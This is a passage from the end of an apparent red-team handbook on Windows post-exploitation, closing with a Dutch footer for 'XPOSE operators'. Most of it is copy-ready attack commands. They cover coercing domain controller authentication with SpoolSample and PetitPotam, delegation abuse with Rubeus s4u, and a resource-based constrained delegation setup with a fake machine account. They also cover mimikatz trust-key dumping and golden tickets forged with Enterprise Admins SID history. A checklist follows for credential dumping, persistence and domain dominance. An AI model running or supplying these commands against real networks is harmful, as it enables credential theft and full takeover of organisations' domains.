# Coerce DC to authenticate (SpoolSample)
SpoolSample.exe DC.domain.local UnconstrainedHost.domain.local

# Or PetitPotam
python PetitPotam.py UnconstrainedHost DC

# Capture DC$ TGT, now DCSync!

# === CONSTRAINED DELEGATION ===
# Computer/user can delegate to SPECIFIC services

# Find constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object name,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto

# Attack: S4U2Self + S4U2Proxy
# If you have the hash of the delegating account:
Rubeus.exe s4u /user:WebSvc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt

# Alternative services (if original is useless):
# cifs/target -> ldap/target, http/target, host/target

# === RESOURCE-BASED CONSTRAINED DELEGATION ===
# Configure any computer you control to delegate to target

# If you have GenericWrite on target computer:
# 1. Create new computer account (or use existing)
# 2. Configure RBCD

# Create computer account
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Configure RBCD
$CompSid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($CompSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TargetComputer -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# S4U attack
Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/targetcomputer.domain.local /ptt
```

---

## 8.4 Domain Trust Abuse

```powershell
# === DOMAIN TRUST ENUMERATION ===
nltest /domain_trusts
Get-DomainTrust
Get-DomainTrustMapping

# === CROSS-DOMAIN ATTACKS ===

# If bidirectional trust exists:
# Golden Ticket with SID History for Enterprise Admin

# Get trust key
mimikatz.exe "lsadump::trust /patch" "exit"

# Create inter-realm TGT
mimikatz.exe "kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /krbtgt:KRBTGT_HASH /sids:ENTERPRISE_ADMIN_SID /ptt" "exit"

# SID History Injection
# Add EA SID to your ticket
# S-1-5-21-PARENT-519 = Enterprise Admins

# Access parent domain
dir \\parent-dc.domain.local\c$
```

---

# 9. POST-EXPLOITATION CHECKLIST

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    COMPLETE POST-EXPLOITATION CHECKLIST                        â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘                                                                               â•‘
â•‘  PHASE 1: INITIAL TRIAGE (First 5 minutes)                                    â•‘
â•‘  â˜ whoami /all - Current user context                                         â•‘
â•‘  â˜ hostname / systeminfo - System info                                        â•‘
â•‘  â˜ Security software check - AV/EDR detection                                 â•‘
â•‘  â˜ net localgroup administrators - Admin check                                â•‘
â•‘  â˜ ipconfig /all - Network position                                           â•‘
â•‘                                                                               â•‘
â•‘  PHASE 2: DEEP ENUMERATION                                                    â•‘
â•‘  â˜ Installed software                                                         â•‘
â•‘  â˜ Running processes with owners                                              â•‘
â•‘  â˜ Scheduled tasks                                                            â•‘
â•‘  â˜ Services and permissions                                                   â•‘
â•‘  â˜ Network connections and listeners                                          â•‘
â•‘  â˜ Domain enumeration (if joined)                                             â•‘
â•‘                                                                               â•‘
â•‘  PHASE 3: CREDENTIAL ACCESS                                                   â•‘
â•‘  â˜ LSASS dump (if admin)                                                      â•‘
â•‘  â˜ SAM/SYSTEM extraction                                                      â•‘
â•‘  â˜ Cached credentials                                                         â•‘
â•‘  â˜ Browser credentials                                                        â•‘
â•‘  â˜ WiFi passwords                                                             â•‘
â•‘  â˜ DPAPI secrets                                                              â•‘
â•‘  â˜ Kerberos tickets                                                           â•‘
â•‘  â˜ Token enumeration                                                          â•‘
â•‘                                                                               â•‘
â•‘  PHASE 4: PRIVILEGE ESCALATION (if needed)                                    â•‘
â•‘  â˜ Unquoted service paths                                                     â•‘
â•‘  â˜ Weak service permissions                                                   â•‘
â•‘  â˜ DLL hijacking opportunities                                                â•‘
â•‘  â˜ AlwaysInstallElevated                                                      â•‘
â•‘  â˜ Token privileges (SeImpersonate)                                           â•‘
â•‘  â˜ UAC bypass                                                                 â•‘
â•‘  â˜ Kernel exploits                                                            â•‘
â•‘                                                                               â•‘
â•‘  PHASE 5: PERSISTENCE                                                         â•‘
â•‘  â˜ Primary persistence mechanism                                              â•‘
â•‘  â˜ Backup persistence mechanism                                               â•‘
â•‘  â˜ Test persistence survives reboot                                           â•‘
â•‘                                                                               â•‘
â•‘  PHASE 6: LATERAL MOVEMENT                                                    â•‘
â•‘  â˜ Identify high-value targets (DCs, file servers)                            â•‘
â•‘  â˜ Test credentials on other hosts                                            â•‘
â•‘  â˜ BloodHound collection and analysis                                         â•‘
â•‘  â˜ Move to additional targets                                                 â•‘
â•‘                                                                               â•‘
â•‘  PHASE 7: DOMAIN DOMINANCE                                                    â•‘
â•‘  â˜ Identify path to Domain Admin                                              â•‘
â•‘  â˜ Execute attack path                                                        â•‘
â•‘  â˜ DCSync / NTDS.dit extraction                                               â•‘
â•‘  â˜ Golden/Silver ticket creation                                              â•‘
â•‘  â˜ Persistence as Domain Admin                                                â•‘
â•‘                                                                               â•‘
â•‘  PHASE 8: OBJECTIVES                                                          â•‘
â•‘  â˜ Document achieved access                                                   â•‘
â•‘  â˜ Screenshot evidence                                                        â•‘
â•‘  â˜ Simulate data exfiltration                                                 â•‘
â•‘  â˜ Prepare for cleanup                                                        â•‘
â•‘                                                                               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

---

**EINDE WINDOWS POST-EXPLOITATION BIBLE**

---

*Dit document bevat geavanceerde post-exploitation technieken.*
*Alleen te gebruiken voor geautoriseerde red team engagements.*
*Kennis van deze technieken is vereist voor senior XPOSE operators.*

